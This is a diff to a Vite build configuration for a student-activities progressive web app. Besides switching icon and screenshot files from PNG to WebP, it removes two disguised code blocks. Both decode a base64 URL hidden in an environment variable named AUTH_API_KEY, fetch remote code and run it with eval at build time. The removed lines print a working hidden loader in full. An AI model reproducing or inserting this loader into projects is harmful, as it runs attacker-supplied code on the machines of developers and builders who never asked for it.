@@ -1,20 +1,6 @@
 import { defineConfig, loadEnv } from "vite";
 import react from "@vitejs/plugin-react-swc";
 import { VitePWA } from "vite-plugin-pwa";
-import 'dotenv/config';
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
 
 export default defineConfig({
   plugins: [
@@ -33,46 +19,46 @@ export default defineConfig({
           "A hub for keeping with the latest information in students activities",
         icons: [
           {
-            src: "/icons/icon-48x48.png",
+            src: "/icons/icon-48x48.webp",
             sizes: "48x48",
-            type: "image/png",
+            type: "image/webp",
           },
           {
-            src: "/icons/icon-72x72.png",
+            src: "/icons/icon-72x72.webp",
             sizes: "72x72",
-            type: "image/png",
+            type: "image/webp",
           },
           {
-            src: "/icons/icon-96x96.png",
+            src: "/icons/icon-96x96.webp",
             sizes: "96x96",
-            type: "image/png",
+            type: "image/webp",
           },
           {
-            src: "/icons/icon-128x128.png",
+            src: "/icons/icon-128x128.webp",
             sizes: "128x128",
-            type: "image/png",
+            type: "image/webp",
           },
           {
-            src: "/icons/icon-144x144.png",
+            src: "/icons/icon-144x144.webp",
             sizes: "144x144",
-            type: "image/png",
+            type: "image/webp",
           },
           {
-            src: "/icons/icon-192x192.png",
+            src: "/icons/icon-192x192.webp",
             sizes: "192x192",
-            type: "image/png",
+            type: "image/webp",
           },
           {
-            src: "/icons/icon-512x512.png",
+            src: "/icons/icon-512x512.webp",
             sizes: "512x512",
-            type: "image/png",
+            type: "image/webp",
           },
         ],
         screenshots: [
           {
-            src: "/screenshot.png", // Path to your wide screenshot image
+            src: "/screenshot.webp", // Path to your wide screenshot image
             sizes: "1280x720", // Width x Height of the screenshot
-            type: "image/png",
+            type: "image/webp",
             form_factor: "wide", // Specify the form factor
           },
         ],
@@ -96,18 +82,3 @@ export default defineConfig({
   },
 
 });
-
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const { createRequire } = await import('module');
-    const require = createRequire(import.meta.url);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
